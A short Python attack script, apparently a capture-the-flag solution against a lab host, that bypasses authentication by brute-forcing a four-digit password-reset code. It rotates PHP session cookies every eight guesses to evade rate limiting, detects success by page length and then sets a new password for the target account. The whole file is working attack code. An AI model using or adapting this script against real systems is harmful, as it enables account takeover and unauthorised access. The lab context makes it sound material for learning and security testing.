  # Authentication bypass by password reset
  # by coderMohammed
  import requests
  import random
  from time import sleep
  
  headers = {
      "User-Agent": "Mozilla/5.0 (iPhone14,3; U; CPU iPhone OS 15_0 like Mac OS X) AppleWebKit/602.1.50 (KHTML, like Gecko) Version/10.0 Mobile/19A346 Safari/602.1",
      "Cookie": "PHPSESSID=mrerfjsol4t2ags5ihvvb632ea"
  }
  url = "http://10.10.12.231:1337/reset_password.php"
  logout = "http://10.10.12.231:1337/logout.php"
  root = "http://10.10.12.231:1337/"
  
  parms = dict()
  ter = 0
  phpsessid = ""
  
  print("[+] Starting attack!")
  sleep(3)
  print("[+] This might take around 5 minutes to finish!")
  
  try:
          while True:
                  parms["recovery_code"] = f"{random.randint(0, 9999):04}" # random number from 0 - 9999 with 4 d
                  parms["s"] = 164 # not important it only efects the frontend
                  res = requests.post(url, data=parms, allow_redirects=True, verify=False, headers=headers)
  
                  if ter == 8: # follow number of trails
                          out = requests.get(logout,headers=headers) # log u out 
                          mainp = requests.get(root) # gets another phpssid (token)
  
                          cookies = out.cookies # extract the sessionid 
                          phpsessid = cookies.get('PHPSESSID')
                          headers["cookies"]=f"PHPSESSID={phpsessid}" #update the headers with new session
  
                          reset = requests.post(url, data={"email":"tester@hammer.thm"}, allow_redirects=True, verify=False, headers=headers) # sends the email to change the password for
                          ter = 0 # reset ter so we get a new session after 8 trails
                  else:
                          ter += 1
                          if(len(res.text) == 2292): # this is the length of the page when u get the recovery code correctly (got by testing)
                                  print(len(res.text)) # for debug info
                                  print(phpsessid) 
  
                                  reset_data = { # here we will change the password to somthing new 
                                  "new_password": "D37djkamd!",
                                  "confirm_password": "D37djkamd!"
                                  }
                                  reset2 = requests.post(url, data=reset_data, allow_redirects=True, verify=False, headers=headers)
  
                                  print("[+] Password has been changed to:D37djkamd!")
                                  break 
  except Exception as e:
          print("[+] Attck stopped")
